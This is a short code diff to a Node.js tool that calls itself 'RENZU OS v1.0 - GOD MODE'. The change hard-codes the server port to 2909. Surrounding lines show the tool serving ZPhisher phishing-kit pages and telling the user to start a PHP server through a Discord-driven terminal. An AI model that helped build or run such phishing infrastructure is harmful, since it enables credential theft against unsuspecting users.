@@ -10,6 +10,7 @@ puppeteer.use(StealthPlugin());
 require('dotenv').config();
 
 const app = express();
+const PORT = 2909;
 
 // --- BROWSER STATE ---
 let browser = null;
@@ -98,7 +99,7 @@ app.get('/', (req, res) => {
                     <h1>⚠️ PHP Environment Detected</h1>
                     <p>ZPhisher is running a PHP site, but this local server only hosts static HTML.</p>
                     <hr style="border:1px solid #333;">
-                    <p style="color:#0f0;"><b>COMMAND TO FIX:</b><br>Type <code>! php -S 0.0.0.0:3000 -t ${webPath}</code> in Discord Terminal!</p>
+                    <p style="color:#0f0;"><b>COMMAND TO FIX:</b><br>Type <code>! php -S 0.0.0.0:${PORT} -t ${webPath}</code> in Discord Terminal!</p>
                 </body>
             `);
         }
@@ -126,7 +127,7 @@ app.get('/', (req, res) => {
             <body>
                 <div class="container">
                     <h1><span class="pulse"></span> RENZU OS v1.0 - GOD MODE</h1>
-                    <div class="status">HOST: ${process.env.PORT || 3000} | ACTIVE_TERM: T${state.activeId} | WEB_ROOT: ${getSmartWebRoot() ? path.basename(getSmartWebRoot()) : 'AUTO'}</div>
+                    <div class="status">HOST: ${PORT} | ACTIVE_TERM: T${state.activeId} | WEB_ROOT: ${getSmartWebRoot() ? path.basename(getSmartWebRoot()) : 'AUTO'}</div>
                     <div class="view-grid">
                         <div class="section">
                             <div class="section-header">📡 Live Browser Feed</div>
@@ -142,7 +143,7 @@ app.get('/', (req, res) => {
         </html>
     `);
 });
-app.listen(process.env.PORT || 3000, () => console.log('🚀 Web Server running on port', process.env.PORT || 3000));
+app.listen(PORT, () => console.log('🚀 Web Server running on port', PORT));
 
 // --- DISCORD CLIENT ---
 const client = new Client({
